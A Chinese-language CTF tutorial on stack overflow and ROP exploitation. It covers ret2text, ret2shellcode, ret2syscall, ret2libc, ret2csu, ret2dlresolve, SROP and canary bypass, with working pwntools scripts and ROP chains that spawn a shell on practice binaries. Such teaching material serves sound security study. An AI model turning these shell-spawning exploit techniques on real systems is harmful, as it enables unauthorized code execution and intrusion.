# 栈溢出与 ROP 题型解法

## 栈溢出原理

栈溢出指的是程序向栈中某个变量写入的字节数超过了变量本身申请的字节数，导致相邻栈变量、保存的 EBP/RBP、返回地址等被覆盖。它本质上是一类缓冲区溢出漏洞，轻则使程序崩溃，重则控制程序执行流程。

发生栈溢出的基本前提：

- 程序必须向栈上写入数据。
- 写入的数据大小没有被良好控制。

常见危险函数：

- 输入：`gets`、`scanf`、`vscanf`、`read` 长度过大。
- 输出：`sprintf`、`vsprintf` 等写入固定缓冲区。
- 字符串：`strcpy`、`strcat`、`bcopy` 等遇到 `\x00` 才停止。

标准分析流程：

1. `checksec` 看保护：Canary、NX、PIE、RELRO。
2. 找危险函数和可控输入位置。
3. 用 IDA/GDB/pwndbg 计算缓冲区到返回地址的偏移。
4. 根据保护选择 ret2text、ret2shellcode、ret2syscall、ret2libc 或更高级 ROP。
5. 写 exp，先本地验证，再切远程。

偏移计算的核心是“我们能写入的地址”和“我们要覆盖的地址”之间的距离。32 位典型布局如下：

```text
高地址
        +-----------------+
        |     retaddr     |
        +-----------------+
        |    saved ebp    |
ebp --->+-----------------+
        |                 |
        |      buffer     |
buf --->+-----------------+
低地址
```

如果 IDA 中变量位于 `ebp-0x14`，返回地址位于 `ebp+4`，则覆盖返回地址通常需要：

```python
payload = b"A" * 0x14 + b"B" * 4 + p32(target_addr)
```

也可以用 cyclic/pattern 验证：

```python
from pwn import *
print(cyclic(200))
print(cyclic_find(0x62616164))
```

## ret2text

ret2text 是控制程序执行程序本身已有的代码，即 `.text` 段中的代码。最典型的特征是程序中存在 `success()`、`backdoor()`、`system("/bin/sh")`，并且地址能被直接确定。

适用条件：

- 能覆盖返回地址。
- 程序没有开启 PIE，或已经泄露出 PIE 基址。
- 目标代码段地址已知。

基本流程：

1. 反编译寻找后门函数或能直接得到 shell 的代码。
2. 计算 offset。
3. 用目标函数地址覆盖返回地址。

示例：

```python
from pwn import *

io = process("./ret2text")
target = 0x804863a
offset = 0x6c + 4
payload = b"A" * offset + p32(target)
io.sendline(payload)
io.interactive()
```

注意：如果程序开启 PIE，`.text` 段基址会随机化，不能直接写静态地址，需要先泄露程序基址，或利用部分覆盖等技巧。

## ret2shellcode

ret2shellcode 是把 shellcode 写入可执行内存区域，然后把返回地址覆盖到 shellcode 起始地址。新版内核和现代编译器通常不再默认存在同时可写可执行的段，因此这种手法依赖环境。

适用特征：

- `checksec` 显示 NX disabled，或 `vmmap` 中栈、bss、某段权限为 `rwx`。
- 程序能把输入复制到栈、bss 或其他可执行区域。
- 能知道 shellcode 的地址，或程序主动打印地址。

典型流程：

1. 生成 shellcode：`asm(shellcraft.sh())`。
2. 确定 shellcode 放置位置：栈缓冲区、bss、mmap 区域。
3. 用 NOP/padding 对齐到返回地址。
4. 返回地址写 shellcode 起始地址。

示例：

```python
from pwn import *

io = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf_addr = int(io.recvline().split()[-1], 16)
offset = 0x48 + 4

payload = shellcode.ljust(offset, b"A") + p32(buf_addr)
io.sendline(payload)
io.interactive()
```

如果 shellcode 被复制到 bss，利用方式是把 shellcode 填入输入，再让返回地址指向 `buf2`：

```python
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
payload = shellcode.ljust(112, b"A") + p32(buf2_addr)
```

若现代系统中需要临时修改权限，可以关注程序是否调用 `mprotect(addr, size, 7)`，或通过 ROP 自行调用 `mprotect` 后再跳 shellcode。

## ROP 基础

NX 开启后，传统的向栈或堆直接注入代码无法执行。ROP 的思想是在栈缓冲区溢出的基础上，复用程序中已有的小片段，也就是 gadget，来改变寄存器或内存，最终控制执行流程。

一个可用 gadget 通常需要满足：

- 有副作用：能修改寄存器、内存，或完成计算。
- 以控制流结束：常见是 `ret`，这样可以继续从栈上取下一个地址串联执行。

ROP 攻击一般需要：

- 漏洞允许劫持控制流，并控制后续返回地址。
- 可以找到满足条件的 gadgets 及其地址。
- 如果 ASLR/PIE 开启，需要先泄露对应段基址。

常用搜索：

```sh
ROPgadget --binary ./pwn --only "pop|ret"
ROPgadget --binary ./pwn --only "syscall|int"
ROPgadget --binary ./pwn --string "/bin/sh"
```

32 位函数参数通常走栈；64 位 System V ABI 前六个参数依次走 `rdi, rsi, rdx, rcx, r8, r9`，系统调用参数则常用 `rdi, rsi, rdx, r10, r8, r9`，系统调用号放 `rax`。

## ret2syscall

ret2syscall 是控制程序执行系统调用。最常用目标是：

```c
execve("/bin/sh", NULL, NULL)
```

32 位 Linux 中：

- `eax = 0xb`
- `ebx = "/bin/sh"` 地址
- `ecx = 0`
- `edx = 0`
- 执行 `int 0x80`

典型 ROP 链：

```text
pop_eax_ret
0xb
pop_edx_ecx_ebx_ret
0
0
binsh
int_0x80
```

示例：

```python
from pwn import *

io = process("./rop")

offset = 112
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408

payload = flat(
    b"A" * offset,
    pop_eax_ret, 0xb,
    pop_edx_ecx_ebx_ret, 0, 0, binsh,
    int_0x80
)
io.sendline(payload)
io.interactive()
```

64 位同理，只是改为设置 `rax=59, rdi=binsh, rsi=0, rdx=0` 后执行 `syscall`。

## ret2libc

ret2libc 是返回到 libc 中的函数，常见目标是 `system("/bin/sh")`。当程序动态链接时，操作系统会把 libc 加载到内存，程序调用标准函数时会跳转到 libc 执行。利用时关键是拿到 libc 基址。

常见特征：

- NX 开启，无法执行 shellcode。
- 有 `puts/printf/write/read` 等可复用 PLT。
- 有 GOT 表项可泄露。
- 漏洞可二次触发，或能回到 `main`。

基础流程：

1. 泄露某个 libc 函数真实地址，如 `puts@got`。
2. 计算 libc 基址：`libc_base = puts_addr - libc.symbols["puts"]`。
3. 计算 `system` 和 `/bin/sh` 地址。
4. 第二次溢出执行 `system("/bin/sh")`。

第一阶段泄露：

```python
from pwn import *

io = process("./ret2libc")
elf = ELF("./ret2libc")

offset = 0x48 + 4
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = elf.symbols["main"]

payload = b"A" * offset
payload += p32(puts_plt) + p32(main_addr) + p32(puts_got)
io.sendline(payload)

io.recvline()
puts_addr = u32(io.recvuntil(b"\n", drop=True)[:4].ljust(4, b"\x00"))
log.success(f"puts addr: {hex(puts_addr)}")
```

第二阶段利用：

```python
libc = ELF("./libc.so.6")
libc_base = puts_addr - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

payload = b"A" * offset
payload += p32(system) + p32(0xdeadbeef) + p32(binsh)
io.sendline(payload)
io.interactive()
```

没有 libc 时的定位方法：

- 多泄露几个函数，用 libc database 或 `LibcSearcher` 匹配。
- 如果能任意读，可以用 `DynELF`。
- `puts`、`printf` 会受 `\x00` 截断影响；`write` 可以指定长度，泄露更稳定。

### 堆栈对齐问题 (x86-64 Stack Alignment)

System V AMD64 ABI 要求函数调用时栈保持 16-byte 对齐（即 `rsp % 16 == 0` 时执行 `call`）。`call` 指令压入 8 字节返回地址后，栈变为 `rsp % 16 == 8`，被调用函数通过 `sub rsp, ...` 重新对齐。`system()` 和许多 libc 函数内部使用了 `movaps` 指令，该指令要求操作数地址 16-byte 对齐，不对齐时触发 SIGSEGV。

ROP 链中直接 `ret` 到 `system` 时，栈对齐取决于：
- 入口时的 `rsp`（受环境变量数量和长度影响 → **本地和远程可能完全不同**）
- ROP 链长度（偶数/奇数个 `push`/`ret`/`call` 影响）

这是本地成功但远程崩溃的最常见原因之一。

**检测不对齐**：远程崩溃在 `movaps xmmword ptr [rsp], ...` 且 `rsp` 末位为 `8`。

**修复方法**：在 ROP 链最前面插入一个额外的 `ret` gadget（仅 8 字节 `c3`，改变栈对齐而不改变任何寄存器）。

```python
ret_gadget = 0x400506  # 任意 ret 指令地址

# 本地测试本地可以，远程崩溃的对齐修复：
payload = flat(
    b"A" * offset,
    ret_gadget,        # <-- 额外 ret 修复栈对齐
    pop_rdi,
    binsh,
    system,
)
```

另一种修复是跳过 `system` 入口的 `push rbp`，直接跳到 `system + 1` 或 `system + offset`（但这不是通用方法，不同 libc 版本偏移不同）。

**调试对齐**：本地与远程环境变量差异会导致 `rsp` 偏移 8 的奇数倍。可以本地用 `env -i ./binary` 清空环境变量模拟远程环境来复现对齐问题。也可以在 GDB 中设 `b system`，`run` 后检查 `c $rsp` 末位。

## ret2csu

64 位下函数参数走寄存器，但题目中常常找不到完整的 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`。这时可以利用 `__libc_csu_init` 中的通用 gadget。

可利用点：

- 尾部 gadget 可以控制 `rbx, rbp, r12, r13, r14, r15`。
- 中间 gadget 会执行：

```asm
mov rdx, r13
mov rsi, r14
mov edi, r15d
call qword ptr [r12+rbx*8]
```

- 设置 `rbx=0, rbp=1`，让 `rbx+1 == rbp`，避免循环继续跳回。
- 设置 `r12` 为想调用的函数指针所在地址，`r13/r14/r15` 分别控制 `rdx/rsi/rdi`。

通用函数：

```python
def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = b"A" * 0x80 + b"B" * 8
    payload += p64(csu_end)
    payload += p64(rbx) + p64(rbp) + p64(r12)
    payload += p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front)
    payload += b"A" * 0x38
    payload += p64(last)
    return payload
```

常见利用链：

1. 用 csu 调 `write(1, write@got, 8)` 泄露 libc。
2. 回 `main`。
3. 用 csu 调 `read(0, bss, size)` 写入 `/bin/sh` 或函数地址。
4. 再次 csu 调 `execve` 或 `system`。

## ret2dlresolve

ret2dlresolve 利用动态链接器 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 的解析流程。动态链接器在解析符号地址时依赖重定位表、动态符号表、动态字符串表。如果攻击者可以伪造这些结构或间接控制解析参数，就能让解析器解析到目标函数，如 `system`。

适用特征：

- 程序动态链接。
- 有栈溢出和栈迁移空间，常用 bss。
- 没有 libc 地址，或难以泄露 libc。
- 可以调用 `read` 写入伪造结构。

ret2dlresolve 常见三种思路：

- 直接控制重定位表项、符号表和字符串表相关内容。
- 间接修改 `.dynamic` 中对字符串表等目标节的索引。
- 伪造 `link_map`。

常见手工思路：

1. 通过第一次溢出把栈迁移到 bss。
2. 在 bss 上布置伪造的 `.rel.plt`、`.dynsym`、`.dynstr` 和 `/bin/sh`。
3. 跳到 `plt0` 或某个 PLT 的第二条指令，触发 `_dl_runtime_resolve`。
4. 让动态链接器把目标符号解析为 `system` 并执行。

现代 exp 中可使用 pwntools 的 `Ret2dlresolvePayload` 简化，但仍然要理解：核心是伪造“解析哪个符号”和“解析后写到哪里”。

## SROP

SROP 即 Sigreturn Oriented Programming。类 Unix 系统处理 signal 时，内核会把寄存器上下文、signal 信息和指向 `sigreturn` 的调用地址保存到用户栈上的 Signal Frame。`sigreturn` 会按 Signal Frame 恢复寄存器。因为 Signal Frame 位于用户地址空间，攻击者如果能控制栈，就可以伪造它。

适用条件：

- 能控制栈内容。
- 能执行 `syscall` 或 `int 0x80`。
- 能让系统调用号为 `sigreturn`：x64 为 `rax=15`，x86 为 `eax=0x77`。
- 空间足够放下整个 Signal Frame。

常见利用：

1. 伪造一个 Signal Frame。
2. 令 `rax=15` 后执行 `syscall`，触发 `sigreturn`。
3. 内核按伪造 frame 恢复寄存器。
4. 设置 `rip=syscall`、`rax=SYS_execve`、`rdi="/bin/sh"`、`rsi=0`、`rdx=0`，执行拿 shell。

pwntools 支持：

```python
from pwn import *

context.arch = "amd64"

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_ret

payload = p64(syscall_ret) + bytes(frame)
```

如果目标是 ORW，也可以串多个 `syscall; ret` 和多个 frame。

## Canary

Canary 是栈溢出保护。函数开始时会把 TLS 中的 `stack_guard` 放到栈上，函数返回前取出栈上的值与 TLS 中值比较；如果不同，就调用 `__stack_chk_fail` 终止程序。

典型栈布局：

```text
高地址
        +-----------------+
        | args            |
        +-----------------+
        | return address  |
        +-----------------+
rbp ->  | old ebp         |
        +-----------------+
rbp-8   | canary value    |
        +-----------------+
        | local variables |
低地址
```

绕过思路：

1. 泄露栈中的 Canary。常见方式是格式化字符串 `%p` 或输出函数打印未截断数据。
2. fork 服务逐字节爆破。fork 子进程会继承父进程 Canary，同一进程不同线程 Canary 也相同。
3. 劫持 `__stack_chk_fail` GOT。在 Partial RELRO 且有任意写时，可以改写其 GOT。
4. 如果能覆盖 TLS 中保存的 Canary，也可以让校验使用攻击者控制的值。

格式化字符串泄露 Canary 时的典型判断：

```text
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
```

找到 `0x41414141` 出现在第几个参数，再根据缓冲区长度计算 Canary 所在参数。例如 32 位 `buf[64]`，如果 `AAAA` 是第 7 个参数，则 Canary 常在：

```text
7 + 64 / 4 = 23
```

然后：

```text
%23$p
```

二次溢出时必须把原 Canary 原样放回：

```python
payload = b"A" * buf_size
payload += p32(canary)
payload += b"B" * saved_ebp_size
payload += p32(target)
```

## 地址获取与保护判断

获取地址可以分为四类：

- 直接寻找地址：No PIE 时 `.text`、`.bss`、GOT/PLT 地址固定。
- 泄露地址：泄露 GOT、栈地址、堆地址、main_arena、返回地址等。
- 推测地址：利用同一段内符号偏移固定，如 libc 中 `puts/system/binsh`。
- 猜测地址：32 位随机化空间较小或远程加载环境固定时可爆破。

常见目标：

- 程序基址：泄露返回地址或函数地址，减去 ELF 偏移。
- libc 基址：泄露 GOT 中真实函数地址，减去 libc 符号偏移。
- 堆基址：泄露 chunk 指针、tcache/unsorted 指针。
- 栈地址：格式化字符串、程序打印、SROP 中 read 返回栈。

保护选择表：

| 保护情况 | 优先打法 |
| --- | --- |
| No Canary, No PIE, NX disabled | ret2shellcode 或 ret2text |
| No Canary, No PIE, NX enabled | ret2text、ret2syscall、ret2libc |
| Canary enabled | 先泄露/爆破 Canary，再 ROP |
| PIE enabled | 先泄露程序基址，或部分覆盖 |
| Full RELRO | 不能改 GOT，考虑 ret2libc、hook、堆目标或 FSOP |
| seccomp 禁用 execve | ORW 读 flag |

## 总结流程

栈溢出类题的主线可以压缩为：

1. 找入口：危险函数或长度错误。
2. 算偏移：IDA 静态 + GDB 动态验证。
3. 看保护：Canary、NX、PIE、RELRO。
4. 找目标：后门函数、shellcode 区域、syscall gadget、libc、动态解析、SROP。
5. 先泄露再利用：地址不确定时优先构造 leak stage。
6. 二次触发：回 `main` 或回漏洞函数，让状态恢复后进入最终 payload。
